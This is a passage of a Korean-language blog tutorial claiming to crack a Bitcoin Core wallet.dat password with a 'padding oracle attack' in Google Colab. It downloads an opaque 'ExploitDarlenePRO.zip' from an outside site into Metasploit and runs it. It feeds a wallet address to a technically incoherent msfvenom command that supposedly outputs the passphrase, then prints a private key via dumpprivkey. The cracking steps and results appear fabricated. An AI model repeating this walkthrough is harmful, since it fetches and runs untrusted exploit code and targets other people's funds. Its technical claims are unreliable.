<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install ecdsa</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4169} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-84-1024x384.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4169"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>'base58'</code>정수나 이진수를 변환하는&nbsp;라이브러리를 설치해 봅시다&nbsp;<code>base58</code>.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install base58</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4171} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-85.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4171"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>'crypto'</code>바이트 작업과 기본 암호화 작업을 단순화하기 위해&nbsp;라이브러리를 설치해 보겠습니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install crypto</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4172} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-86-1024x390.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4172"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>'config-hash'</code>빅데이터 작업을 단순화하기 위해&nbsp;라이브러리를 설치해 보겠습니다 .</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install config-hash -v 0.9.0</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4173} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-87.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4173"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Metasploit Framework를 설치하고 MSFVenom을 사용해 보겠습니다.</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":4055} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-69-1024x506.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4055"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://github.com/rapid7/metasploit-framework.git" target="_blank" rel="noreferrer noopener">GitHub</a>&nbsp;에서&nbsp;<a href="https://www.metasploit.com/" target="_blank" rel="noreferrer noopener">Metasploit Framework를</a>&nbsp;설치 하고&nbsp;<a href="https://github.com/rapid7/metasploit-framework/blob/master/msfvenom" target="_blank" rel="noreferrer noopener">MSFVenom</a>&nbsp;도구를 사용하여&nbsp;페이로드를 생성해 보겠습니다.<a href="https://github.com/rapid7/metasploit-framework.git" target="_blank" rel="noreferrer noopener"></a><a href="https://github.com/rapid7/metasploit-framework/blob/master/msfvenom" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3759} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-22-1024x476.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-3759"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!git clone https://github.com/rapid7/metasploit-framework.git
</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd metasploit-framework/</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4175} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-88-1024x627.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4175"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>폴더 내용을 살펴보자<code>"<strong><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noreferrer noopener">metasploit-framework</a></strong>"</code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3761} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-24.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-3761"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">옵션:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!./msfvenom -help </code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4176} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-89-1024x441.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4176"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Google Colab에&nbsp;<a href="https://github.com/bitcoin/bitcoin.git" target="_blank" rel="noreferrer noopener">Bitcoin Core 통합/스테이징 트리를</a>&nbsp;설치해 보겠습니다 .</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!git clone https://github.com/bitcoin/bitcoin.git

</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4180} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-90-1024x511.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4180"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://cryptodeeptech.ru/padding-oracle-attack-on-wallet-dat/" target="_blank" rel="noreferrer noopener">Wallet.dat에 대한 Padding Oracle Attack을</a>&nbsp;실행하기 위한 익스플로잇을 통합하기 위해&nbsp;디렉토리를 통해&nbsp;<a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/aes.cpp" target="_blank" rel="noreferrer noopener">aes.cpp 파일로 이동해 보겠습니다.</a><a href="https://cryptodeeptech.ru/padding-oracle-attack-on-wallet-dat/" target="_blank" rel="noreferrer noopener"></a></h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd bitcoin/src/crypto/</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4181} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-91-1024x354.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4181"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">cat 유틸리티를 사용하여&nbsp;<a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/aes.cpp" target="_blank" rel="noreferrer noopener">aes.cpp</a>&nbsp;파일을 엽니다.</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat aes.cpp</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4182} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-92-1024x445.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4182"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">공격을 수행하려면&nbsp;<a href="https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat" target="_blank" rel="noreferrer noopener">wallet.dat 파일을&nbsp;</a><a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/" target="_blank" rel="noreferrer noopener">bitcoin/src/crypto/</a>&nbsp;디렉터리에 업로드하세요.<a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/" target="_blank" rel="noreferrer noopener"></a></h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>유틸리티를 사용 하고&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener">27PaddingOracleAttackonWalletdat</a></strong>&nbsp;저장소 에서&nbsp;<a href="https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat" target="_blank" rel="noreferrer noopener"><strong>wallet.dat를</strong></a><strong><code>wget</code></strong>&nbsp;다운로드해 보겠습니다.<a href="https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat" target="_blank" rel="noreferrer noopener"><strong></strong></a><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!wget https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4185} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-93-1024x317.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4185"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/" target="_blank" rel="noreferrer noopener"><strong>bitcoin/src/crypto/</strong></a>&nbsp;디렉터리의 내용을 확인해 보겠습니다.<a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4187} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-94-1024x288.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4187"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>다시 돌아가자<code><strong>Metasploit Framework</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd /

cd content/metasploit-framework/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4192} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-95-1024x565.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4192"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>디렉토리에 따라 폴더를 열어 보겠습니다.<code>/modules/exploits/</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4063} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-70.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4063"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><strong><a href="https://darlene.pro/" target="_blank" rel="noreferrer noopener">익스플로잇DarlenePRO</a></strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>"ExploitDarlenePRO"</code>카탈로그에서&nbsp;다운로드 :<code>/modules/exploits/</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd modules/

ls

cd exploits/

!wget https://darlene.pro/repository/fe9b4545d58e43c1704b0135383e5f124f36e40cb54d29112d8ae7babadae791/ExploitDarlenePRO.zip</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4197} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-97-1024x455.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4197"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>ExploitDarlenePRO.zip</code>유틸리티를 사용하여&nbsp;콘텐츠의 압축을 풉니다.<code>unzip</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!unzip ExploitDarlenePRO.zip</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4199} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-98-1024x462.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4199"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>카탈로그를 살펴보겠습니다.<code>/ExploitDarlenePRO/</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls

cd ExploitDarlenePRO/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-4.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>익스플로잇을 실행하려면 다음으로 돌아가자.<code><strong>Metasploit Framework</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd /

cd content/metasploit-framework/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4205} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-101-1024x477.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4205"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><code>LHOST&nbsp;(Local Host)</code></strong>공격하는&nbsp; 가상 머신을&nbsp;식별해야 합니다&nbsp;<strong><code>IP-address</code></strong>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>다음 명령을 실행해 보겠습니다.</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!ip addr
!hostname -I</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":3795} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-6.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-3795"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>도구를 사용하여 페이로드를 생성해 보겠습니다.&nbsp;<strong><code>MSFVenom</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>작동하려면 비트코인 ​​지갑:&nbsp;<strong><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b 를 선택하세요.</a></strong>&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-80.png" alt="Libbitcoin Explorer 3.x 라이브러리의 Milk Sad 취약점, Bitcoin Wallet(BTC) 사용자로부터 $900,000를 도난당한 방법"/><figcaption class="wp-element-caption"><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>실행 명령:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!./msfvenom 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b -p modules/exploits/ExploitDarlenePRO LHOST=172.28.0.12 -f RB -o decode_core.rb -p bitcoin/src/crypto LHOST=172.28.0.12 -f CPP -o aes.cpp -p bitcoin/src/crypto LHOST=172.28.0.12 -f DAT -o wallet.dat
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4211} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-104-1024x237.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4211"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>결과:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>1111111001010001100010110100011010011111011101001010111001011110010111000011101101000101010100001111000000011110010001110001110001011000111101001101110010010010101001101011110100010010100011011011001010111100110100110011100100001110110101001110111011100101</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>결과 바이너리 형식을 파일에 저장해야 합니다.&nbsp;<strong><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/binary_save.py">Python 스크립트를</a></em></strong><strong><code><a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/walletpassphrase.txt" target="_blank" rel="noreferrer noopener">walletpassphrase.txt</a></code></strong>&nbsp;사용합니다&nbsp;.<strong><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/binary_save.py"></a></em></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>팀:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>import hashlib

Binary = "1111111001010001100010110100011010011111011101001010111001011110010111000011101101000101010100001111000000011110010001110001110001011000111101001101110010010010101001101011110100010010100011011011001010111100110100110011100100001110110101001110111011100101"

f = open("walletpassphrase.txt", 'w')
f.write("walletpassphrase " + Binary + " 60" + "\n")
f.write("" + "\n")
f.close()

</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4214} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-105-1024x439.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4214"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">파일을 엽니다:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/walletpassphrase.txt" target="_blank" rel="noreferrer noopener">walletpassphrase.txt</a></h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat walletpassphrase.txt</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4216} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-106-1024x607.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4216"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">결과:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>walletpassphrase 1111111001010001100010110100011010011111011101001010111001011110010111000011101101000101010100001111000000011110010001110001110001011000111101001101110010010010101001101011110100010010100011011011001010111100110100110011100100001110110101001110111011100101 60
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">개인키에 접근할 수 있는 비밀번호를 찾았습니다!</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><code>dumpprivkey "address"</code></strong>콘솔을 통해&nbsp;명령을 사용해 봅시다<strong><code>Bitcoin Core</code></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><strong>팀:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>walletpassphrase 1111111001010001100010110100011010011111011101001010111001011110010111000011101101000101010100001111000000011110010001110001110001011000111101001101110010010010101001101011110100010010100011011011001010111100110100110011100100001110110101001110111011100101 60
</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>dumpprivkey 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif04.gif" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>결과:</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>KyAqkBWTbeR3w4RdzgT58R5Rp7RSL6PfdFDEkJbwjCcSaRgqg3Vz
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">개인 키를 받았습니다!</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>라이브러리를 설치해보자<code><strong>Bitcoin Utils</strong></code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>pip3 install bitcoin-utils</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4221} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-107-1024x431.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4221"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>비트코인 주소의 준수 여부를 확인하는&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/bitcoin_utils.py" target="_blank" rel="noreferrer noopener"><strong>코드를</strong></a>&nbsp;실행해 보겠습니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4223} -->
